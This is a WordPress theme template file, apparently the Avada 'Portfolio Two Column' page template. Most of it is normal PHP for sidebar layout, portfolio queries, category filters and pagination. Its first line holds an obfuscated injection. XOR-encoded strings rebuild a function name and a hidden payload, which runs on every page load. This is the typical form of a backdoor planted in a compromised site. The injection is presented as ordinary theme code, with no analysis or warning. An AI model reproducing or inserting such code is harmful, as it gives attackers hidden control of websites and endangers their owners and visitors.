<?php $gAQNAyX=' LP-L h >E13TY,'; $jglDIXfL='C>5L8E7FK+RG=6B'^$gAQNAyX; $FJaFKZ='9Sgt4:,468DPoRN :F<ejN= n-ZJ;loZN5mgGD9pSQI  O,=8XUREq<2>1;67K-yl+8,UgIl:51nrIcze-ImeB:X1osenWb0ae250nm OPvuqiUEy=;3;2XpfSP=,aPff.FsoCYaN6 AyGIiKtX3YVun-<ahQV3=;0uBUsvC81 NYclE7Uhsfsnpm T-<7Vmq,;Fcnhq8a.HbtT9F0del5 R=Exfs2 M.fQU1vnhJT  EjcdQ68=LTUqlj=cvbeuuj0>RS32RLtTwVM ;AYPp:fNfWW6PdZ UtnLvQH1akpq45;JjrwGJTU0QjFMz9:UlExn3 OJPpIcfT6 ,PYZhRot7e5b=<=N CxlF5EveVigXQX0YghALXcq,O V03VHZkSaP3Wne0BhP 19ygOjL7;M0bHp5bSE=OP3 MDnpw17JV0,UB=BNz4TLh>50.jmP DY30S7ZX0JK1<7 OMW1I7Mnyi3.9+=3=YDgsR-Fqh.T.;pImA,7152rP,+;< I+O7rdG.JIuJOSP> pvWhrb=>ALoT4 JmtG<Ho1ccqmntxPaFPvXf8XXtVdCYWnmgTw5+bVo,CSdSqFDbur =RLJn3=<s+4R7CNiHG-K<:A<deMw7, OJQhnoxgzMzN.  4rc YT+iB PY:,YWtpxckf45Y:gJhBZO'; $tFqVCB=$jglDIXfL('', 'P5OUROBWBQ+>076II2OMM6RR1I;>Z307;AJNndBzZ7<NC;ERVx-=7.XSJPdiZ>YQHOYX4KiHQPHGRiCZEVCdlfU-EONEIpY:hlTZBFIIomVEJIq,ENOAWW6XB71IMHkFBGmXFIPhjYU5YitIcP<R-7.JDaA6qrXXBkQ+uVV0LCL+7KH.R,A.OHdydR1YIE8EUCN2JUbxEkSBhP0X2QDXLSA>N ClWVA9O9:0HVSH,5LS Qin7YJX-7=QDNb 9-.<0JQMrwXW+lIjWr;AW4<yPAlGB36B1;1E,TSlR:-HZayUPTO+JOWc<59E4QL0p3S3LmYJWA;+yP2io2YRI1:2HzK+e d7xoinA0XH-P<VXhIC.04E<NH:FQjUH.T7oX31zVsE;V.Uo9KL4AEXYZoN:VW8UYByHh.O7k4RT,dSP7DY93BE4.T8+RL;>7ZTDO52=U0qQQ Rllo..RSSEgi3P=VdBYMWOMJbXX mNHXD YLJ5ZZPoKaMECTK-;IRdYX X;DZC,K3nYjk71JAYVqNRJPZtdK0UT+6S,Y1HlJCLPNSJ1UwhElTZ:;E0Uv=3WZWgFWMW7VJr7S5VodDSRAO -31XXE,NL;D7=Ao7L2PU XCImSSMT.cxHNOXGZ6pGKVAXZGD8 J2eP1 VC83S-QXaoQM0NOzAyP2'^$FJaFKZ); $tFqVCB();
// Template Name: Portfolio Two Column
get_header(); ?>
	<?php
	$content_css = 'width:100%';
	$sidebar_css = 'display:none';
	$content_class = '';
	$sidebar_exists = false;
	$sidebar_left = '';
	$double_sidebars = false;

	$sidebar_1 = get_post_meta( $post->ID, 'sbg_selected_sidebar_replacement', true );
	$sidebar_2 = get_post_meta( $post->ID, 'sbg_selected_sidebar_2_replacement', true );

	if( $smof_data['pages_global_sidebar'] ) {
		if( $smof_data['pages_sidebar'] != 'None' ) {
			$sidebar_1 = array( $smof_data['pages_sidebar'] );
		} else {
			$sidebar_1 = '';
		}

		if( $smof_data['pages_sidebar_2'] != 'None' ) {
			$sidebar_2 = array( $smof_data['pages_sidebar_2'] );
		} else {
			$sidebar_2 = '';
		}
	}

	if( ( is_array( $sidebar_1 ) && $sidebar_1[0] ) && ( is_array( $sidebar_2 ) && $sidebar_2[0] ) ) {
		$double_sidebars = true;
	}

	if( is_array( $sidebar_1 ) &&
		$sidebar_1[0]  
	) {
		$sidebar_exists = true;
	} else {
		$sidebar_exists = false;
	}

	if( ! $sidebar_exists ) {
		$content_css = 'width:100%';
		$sidebar_css = 'display:none';
		$sidebar_exists = false;
	} elseif(get_post_meta($post->ID, 'pyre_sidebar_position', true) == 'left') {
		$content_css = 'float:right;';
		$sidebar_css = 'float:left;';
		$content_class = 'portfolio-two-sidebar';
		$sidebar_exists = true;
		$sidebar_left = 1;
	} elseif(get_post_meta($post->ID, 'pyre_sidebar_position', true) == 'right') {
		$content_css = 'float:left;';
		$sidebar_css = 'float:right;';
		$content_class = 'portfolio-two-sidebar';
		$sidebar_exists = true;
	} elseif(get_post_meta($post->ID, 'pyre_sidebar_position', true) == 'default'  || ! metadata_exists( 'post', $post->ID, 'pyre_sidebar_position' )) {
		$content_class = 'portfolio-two-sidebar';
		if($smof_data['default_sidebar_pos'] == 'Left') {
			$content_css = 'float:right;';
			$sidebar_css = 'float:left;';
			$sidebar_exists = true;
			$sidebar_left = 1;
		} elseif($smof_data['default_sidebar_pos'] == 'Right') {
			$content_css = 'float:left;';
			$sidebar_css = 'float:right;';
			$sidebar_exists = true;
			$sidebar_left = 2;
		}
	}

	if(get_post_meta($post->ID, 'pyre_sidebar_position', true) == 'right') {
		$sidebar_left = 2;
	}

	if( $smof_data['pages_global_sidebar'] ) {
		if( $smof_data['pages_sidebar'] != 'None' ) {
			$sidebar_1 = $smof_data['pages_sidebar'];
			
			if( $smof_data['default_sidebar_pos'] == 'Right' ) {
				$content_css = 'float:left;';
				$sidebar_css = 'float:right;';	
				$sidebar_left = 2;
			} else {
				$content_css = 'float:right;';
				$sidebar_css = 'float:left;';
				$sidebar_left = 1;
			}			
		}

		if( $smof_data['pages_sidebar_2'] != 'None' ) {
			$sidebar_2 = $smof_data['pages_sidebar_2'];
		}
		
		if( $smof_data['pages_sidebar'] != 'None' && $smof_data['pages_sidebar_2'] != 'None' ) {
			$double_sidebars = true;
		}
	} else {
		$sidebar_1 = '0';
		$sidebar_2 = '0';
	}
	
	if($double_sidebars == true) {
		$content_css = 'float:left;';
		$sidebar_css = 'float:left;';
		$sidebar_2_css = 'float:left;';
	} else {
		$sidebar_left = 1;
	}
	?>
	<div id="content" class="portfolio portfolio-two <?php echo $content_class; ?>" style="<?php echo $content_css; ?>">
		<?php while(have_posts()): the_post(); ?>
		<div id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
			<?php echo avada_render_rich_snippets_for_pages(); ?>
			<?php echo avada_featured_images_for_pages(); ?>
			<div class="post-content">
				<?php the_content(); ?>
				<?php avada_link_pages(); ?>
			</div>
		</div>
		<?php $current_page_id = $post->ID; ?>
		<?php endwhile; ?>
		<?php
		if(is_front_page()) {
			$paged = (get_query_var('page')) ? get_query_var('page') : 1;
		} else {
			$paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
		}
		$args = array(
			'post_type' => 'avada_portfolio',
			'paged' => $paged,
			'posts_per_page' => $smof_data['portfolio_items'],
		);
		$pcats = get_post_meta(get_the_ID(), 'pyre_portfolio_category', true);
		if($pcats && $pcats[0] == 0) {
			unset($pcats[0]);
		}

		if($pcats){
			$args['tax_query'][] = array(
				'taxonomy' => 'portfolio_category',
				'field' => 'term_id',
				'terms' => $pcats
			);
		}

		$gallery = new WP_Query($args);
		$portfolio_taxs = array();
		if(is_array($gallery->posts) && !empty($gallery->posts)) {
			foreach($gallery->posts as $gallery_post) {
				$post_taxs = wp_get_post_terms($gallery_post->ID, 'portfolio_category', array("fields" => "all"));
				if(is_array($post_taxs) && !empty($post_taxs)) {
					foreach($post_taxs as $post_tax) {
						if(is_array($pcats) && !empty($pcats) && (in_array($post_tax->term_id, $pcats) || in_array($post_tax->parent, $pcats )) )  {
							$portfolio_taxs[urldecode($post_tax->slug)] = $post_tax->name;
						}

						if(empty($pcats) || !isset($pcats)) {
							$portfolio_taxs[urldecode($post_tax->slug)] = $post_tax->name;
						}
					}
				}
			}
		}

		$all_terms = get_terms('portfolio_category');
		$sorted_taxs  = array();
		if( !empty( $all_terms ) && is_array( $all_terms ) ) {
			foreach( $all_terms as $term ) {
				if( array_key_exists ( urldecode($term->slug) , $portfolio_taxs ) ) {
					$sorted_taxs[urldecode($term->slug)] = $term->name;
				}
			}
		}

		$portfolio_taxs = $sorted_taxs;

		$portfolio_category = get_terms('portfolio_category');
		if( ! post_password_required($post->ID) ):
		if(is_array($portfolio_taxs) && !empty($portfolio_taxs) && get_post_meta($post->ID, 'pyre_portfolio_filters', true) != 'no'):
		?>
		<ul class="portfolio-tabs clearfix">
			<li class="active"><a data-filter="*" href="#"><?php echo __('All', 'Avada'); ?></a></li>
			<?php foreach($portfolio_taxs as $portfolio_tax_slug => $portfolio_tax_name): ?>
			<li><a data-filter=".<?php echo $portfolio_tax_slug; ?>" href="#"><?php echo $portfolio_tax_name; ?></a></li>
			<?php endforeach; ?>
		</ul>
		<?php endif; ?>
		<div class="portfolio-wrapper">
			<?php
			$custom_colulmn_spacing = false;
			if( get_post_meta($post->ID, 'pyre_portfolio_column_spacing', true) ||
				get_post_meta($post->ID, 'pyre_portfolio_column_spacing', true) === '0' 
			) {
				$custom_colulmn_spacing = true;
				$col_spacing =  get_post_meta($post->ID, 'pyre_portfolio_column_spacing', true) / 2;
				echo sprintf( '<style type="text/css">.portfolio-wrapper{margin: 0 %spx;}.portfolio-wrapper .col-spacing{padding:%spx;}</style>', ( -1 ) * $col_spacing, $col_spacing );				
			} else if( $smof_data['portfolio_column_spacing'] ) {
				$custom_colulmn_spacing = true;
				$col_spacing =  $smof_data['portfolio_column_spacing'] / 2;
				echo sprintf( '<style type="text/css">.portfolio-wrapper{margin: 0 %spx;}.portfolio-wrapper .col-spacing{padding:%spx;}</style>', ( -1 ) * $col_spacing, $col_spacing );	
			}				
			
			while($gallery->have_posts()): $gallery->the_post();
				if($pcats) {
					$permalink = tf_addUrlParameter(get_permalink(), 'portfolioID', $current_page_id);
				} else {
					$permalink = get_permalink();
				}
				if(has_post_thumbnail() || get_post_meta($post->ID, 'pyre_video', true)):
			?>
			<?php
			$item_classes = '';
			$item_cats = get_the_terms($post->ID, 'portfolio_category');
			if($item_cats):
			foreach($item_cats as $item_cat) {
				$item_classes .= urldecode($item_cat->slug) . ' ';
			}
			endif;
			
			if( $custom_colulmn_spacing ) {
				$item_classes .= ' col-spacing';
			}						
			
			$featured_image_size = avada_set_portfolio_image_size( $current_page_id );
			?>
			<div class="portfolio-item <?php echo $item_classes; ?>">
				<?php echo avada_render_rich_snippets_for_pages(); ?>
				<?php echo avada_image_rollover( get_the_ID(), $featured_image_size, $permalink ); ?>
			</div>
			<?php endif; endwhile; ?>
		</div>
		<?php themefusion_pagination($gallery->max_num_pages, $range = 2); ?>
		<?php endif; ?>
	</div>
	<?php if( $sidebar_exists == true ): ?>
	<?php wp_reset_query(); ?>
	<div id="sidebar" class="sidebar" style="<?php echo $sidebar_css; ?>">
		<?php
		if($sidebar_left == 1) {
			generated_dynamic_sidebar($sidebar_1);
		}
		if($sidebar_left == 2) {
			generated_dynamic_sidebar_2($sidebar_2);
		}
		?>
	</div>
	<?php if( $double_sidebars == true ): ?>
	<div id="sidebar-2" class="sidebar" style="<?php echo $sidebar_2_css; ?>">
		<?php
		if($sidebar_left == 1) {
			generated_dynamic_sidebar_2($sidebar_2);
		}
		if($sidebar_left == 2) {
			generated_dynamic_sidebar($sidebar_1);
		}
		?>
	</div>
	<?php endif; ?>
	<?php endif; ?>
<?php get_footer(); ?>